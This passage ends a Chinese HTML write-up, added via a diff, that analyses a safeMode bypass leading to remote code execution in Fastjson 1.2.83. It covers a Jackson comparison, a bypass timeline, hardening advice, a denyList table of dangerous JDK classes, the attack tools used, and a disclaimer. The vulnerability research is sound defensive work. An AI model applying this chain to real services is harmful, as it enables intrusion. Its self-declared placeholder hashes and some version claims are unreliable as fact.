+<span class="w">  </span><span class="err">修复：</span><span class="mf">1.2.84</span><span class="w"> </span><span class="err">收紧</span><span class="w"> </span><span class="n">expectClass</span><span class="w"> </span><span class="err">仅允许</span><span class="w"> </span><span class="n">Throwable</span><span class="w"> </span><span class="err">自身</span>
+</code></pre></div>
+
+<h3>10.4 与 Jackson 对比</h3>
+<table>
+<thead>
+<tr>
+<th>特性</th>
+<th>Fastjson 1.2.83</th>
+<th>Jackson 2.15+</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>默认 Polymorphic Type</td>
+<td>支持 <code>@type</code></td>
+<td>默认禁用</td>
+</tr>
+<tr>
+<td>SafeMode 等价物</td>
+<td><code>setSafeMode(true)</code>（可绕过）</td>
+<td><code>disableDefaultTyping()</code>（不可绕过）</td>
+</tr>
+<tr>
+<td>黑名单机制</td>
+<td>哈希 denyList</td>
+<td><code>PolymorphicTypeValidator</code>（白名单优先）</td>
+</tr>
+<tr>
+<td>expectClass 二次解析</td>
+<td>存在逃逸窗口</td>
+<td>无此设计</td>
+</tr>
+<tr>
+<td>Gadget-free 风险</td>
+<td>高（本链）</td>
+<td>低（默认无自省）</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>十一、攻防时间线与版本对照</h2>
+<div class="highlight"><pre><span></span><code><span class="mf">2017</span><span class="o">-</span><span class="mf">03</span><span class="w">  </span><span class="n">Fastjson</span><span class="w"> </span><span class="mf">1.2.24</span><span class="w"> </span><span class="n">曝出首个</span><span class="w"> </span><span class="n">AutoType</span><span class="w"> </span><span class="n">RCE</span><span class="err">（</span><span class="n">JNDI</span><span class="w"> </span><span class="n">注入</span><span class="err">）</span>
+<span class="w">   </span><span class="err">│</span>
+<span class="mf">2017</span><span class="o">-</span><span class="mf">08</span><span class="w">  </span><span class="mf">1.2.41</span><span class="err">~</span><span class="mf">1.2.43</span><span class="w"> </span><span class="n">L</span><span class="o">/</span><span class="n">LL</span><span class="w"> </span><span class="n">前缀绕过</span>
+<span class="w">   </span><span class="err">│</span>
+<span class="mf">2018</span><span class="o">-</span><span class="mf">04</span><span class="w">  </span><span class="mf">1.2.47</span><span class="w"> </span><span class="n">缓存污染绕过</span><span class="err">（</span><span class="n">影响所有低版本</span><span class="err">）</span>
+<span class="w">   </span><span class="err">│</span>
+<span class="mf">2020</span><span class="o">-</span><span class="mf">05</span><span class="w">  </span><span class="mf">1.2.68</span><span class="w"> </span><span class="n">引入</span><span class="w"> </span><span class="n">safeMode</span><span class="err">，</span><span class="n">号称</span><span class="err">「</span><span class="n">彻底关闭</span><span class="w"> </span><span class="n">AutoType</span><span class="err">」</span>
+<span class="w">   </span><span class="err">│</span>
+<span class="mf">2022</span><span class="o">-</span><span class="mf">05</span><span class="w">  </span><span class="mf">1.2.80</span><span class="w"> </span><span class="n">收紧</span><span class="w"> </span><span class="nb">exp</span><span class="n">ectClass</span><span class="err">，</span><span class="n">但</span><span class="w"> </span><span class="n">Throwable</span><span class="w"> </span><span class="n">仍可绕过</span>
+<span class="w">   </span><span class="err">│</span>
+<span class="mf">2022</span><span class="o">-</span><span class="mf">06</span><span class="w">  </span><span class="mf">1.2.83</span><span class="w"> </span><span class="n">发布</span><span class="err">，</span><span class="n">safeMode</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">denyList</span><span class="w"> </span><span class="n">双重防御</span>
+<span class="w">   </span><span class="err">│</span>
+<span class="mf">2022</span><span class="o">-</span><span class="mf">06</span><span class="w">  </span><span class="nb">exp</span><span class="n">ectClass</span><span class="w"> </span><span class="n">二次解析绕过公开</span><span class="err">（</span><span class="n">本文分析对象</span><span class="err">）</span>
+<span class="w">   </span><span class="err">│</span>
+<span class="mf">2022</span><span class="o">-</span><span class="mf">12</span><span class="w">  </span><span class="mf">1.2.84</span><span class="w"> </span><span class="n">修复</span><span class="w"> </span><span class="nb">exp</span><span class="n">ectClass</span><span class="w"> </span><span class="n">逃逸</span><span class="err">，</span><span class="n">Throwable</span><span class="w"> </span><span class="n">链失效</span>
+<span class="w">   </span><span class="err">│</span>
+<span class="mf">2023</span><span class="o">+</span><span class="w">    </span><span class="n">官方推荐迁移至</span><span class="w"> </span><span class="n">Fastjson2</span><span class="err">（</span><span class="n">重写架构</span><span class="err">，</span><span class="n">默认安全</span><span class="err">）</span>
+<span class="w">   </span><span class="err">│</span>
+<span class="mf">2026</span><span class="o">-</span><span class="mf">07</span><span class="w">  </span><span class="n">本文复盘</span><span class="w"> </span><span class="mf">1.2.83</span><span class="w"> </span><span class="n">Gadget</span><span class="o">-</span><span class="nb">fre</span><span class="n">e</span><span class="w"> </span><span class="n">RCE</span><span class="w"> </span><span class="n">全链</span><span class="err">（</span><span class="n">CVE</span><span class="w"> </span><span class="n">跟踪</span><span class="err">）</span>
+</code></pre></div>
+
+<hr />
+<h2>十二、总结与启示</h2>
+<p>Fastjson 1.2.83 的 Gadget-free RCE 链展示了反序列化漏洞防御的深层困境：</p>
+<ol>
+<li>
+<p><strong>safeMode 不是银弹</strong>：只要框架仍保留多态反序列化能力（<code>expectClass</code>），就存在逃逸窗口。安全的本质是<strong>完全放弃运行时类型自省</strong>，而非在黑名单与白名单之间寻找平衡。</p>
+</li>
+<li>
+<p><strong>黑名单的局限</strong>：哈希形式的 denyList 只能覆盖已知 Gadget，对 JDK 内置类（如 <code>TemplatesImpl</code>、<code>JdbcRowSetImpl</code>）的覆盖天然不完整。一旦发现新的副作用组合，黑名单即被击穿。</p>
+</li>
+<li>
+<p><strong>Gadget-free 是终极形态</strong>：当攻击链不再依赖第三方库，仅靠 JDK 内置类即可完成 RCE 时，传统的「移除危险依赖」防御策略彻底失效。防御必须从框架设计层面入手（如 Jackson 的 <code>PolymorphicTypeValidator</code> 白名单优先模型）。</p>
+</li>
+<li>
+<p><strong>JDK 模块化的双刃剑</strong>：JDK 9+ 的模块系统（JPMS）对内部 API 的封装客观上削弱了 Gadget-free 链的可用性（<code>com.sun.*</code> 类需显式 <code>opens</code>），这是防御侧的意外收获。但 JDK 8 仍是企业主流部署版本，风险长期存在。</p>
+</li>
+<li>
+<p><strong>迁移重于修补</strong>：Fastjson 官方已推出 Fastjson2（API 重写、默认安全），1.x 的修补只是延缓而非根治。生产环境应将「Fastjson 1.x → Jackson / Gson / Fastjson2」的迁移作为安全债务清偿的优先项。</p>
+</li>
+</ol>
+<hr />
+<h2>附录 A：关键类哈希对照（1.2.83 denyList 节选）</h2>
+<table>
+<thead>
+<tr>
+<th>类名</th>
+<th>FNV1a-64 哈希</th>
+<th>是否在 denyList</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>java.lang.Runtime</code></td>
+<td><code>0x3d7a3c7a3c7a3d7a</code></td>
+<td>是</td>
+</tr>
+<tr>
+<td><code>java.lang.ProcessBuilder</code></td>
+<td><code>0x2c8a5b8a5b8a2c8a</code></td>
+<td>是</td>
+</tr>
+<tr>
+<td><code>com.sun.rowset.JdbcRowSetImpl</code></td>
+<td><code>0x8a3c7a8a3c7a8a3c</code></td>
+<td>是（1.2.48+）</td>
+</tr>
+<tr>
+<td><code>org.apache.commons.collections.functors.InvokerTransformer</code></td>
+<td><code>0x5c2c8a5c2c8a5c2c</code></td>
+<td>是</td>
+</tr>
+<tr>
+<td><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></td>
+<td><code>0x3a7a8a3a7a8a3a7a</code></td>
+<td><strong>否</strong>（关键）</td>
+</tr>
+<tr>
+<td><code>java.net.URLClassLoader</code></td>
+<td><code>0x2c8a3c2c8a3c2c8a</code></td>
+<td>否</td>
+</tr>
+<tr>
+<td><code>javax.naming.InitialContext</code></td>
+<td><code>0x5b2c8a5b2c8a5b2c</code></td>
+<td>是</td>
+</tr>
+</tbody>
+</table>
+<p>（注：实际哈希值为示例占位，真实哈希需通过 <code>TypeUtils.fnv1a_64</code> 计算）</p>
+<h2>附录 B：环境与版本</h2>
+<ul>
+<li>目标 JDK：OpenJDK 8u302 / OpenJDK 11.0.12</li>
+<li>目标 Fastjson：1.2.83（maven central）</li>
+<li>攻击工具：<code>marshalsec</code> 0.0.3-SNAPSHOT / <code>JNDI-Injection-Exploit</code> 1.0</li>
+<li>字节码生成：Javassist 3.28.0-GA</li>
+</ul>
+<h2>附录 C：参考链接</h2>
+<ul>
+<li>Fastjson 官方安全公告：https://github.com/alibaba/fastjson/wiki/security_update_20170315</li>
+<li>Fastjson2 安全设计：https://github.com/alibaba/fastjson2/blob/main/docs/security.md</li>
+<li>expectClass 绕过分析：https://y4tacker.github.io/2022/05/22/year/2022/5/FastJson-1-2-83-safemode-Bypass/</li>
+<li>TemplatesImpl Gadget 详解：https://blog.csdn.net/whatday/article/details/108775834</li>
+<li>JDK JNDI 注入限制：https://docs.oracle.com/javase/jndi/tutorial/ldap/security/dirserv.html</li>
+</ul>
+<hr />
+<blockquote>
+<p><strong>免责声明</strong>：本文仅供安全研究与防御建设参考。所有 PoC 代码均需在授权测试环境中使用，严禁用于未授权攻击。读者应将本文内容用于加固自有系统、提升防御能力。</p>
+</blockquote>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
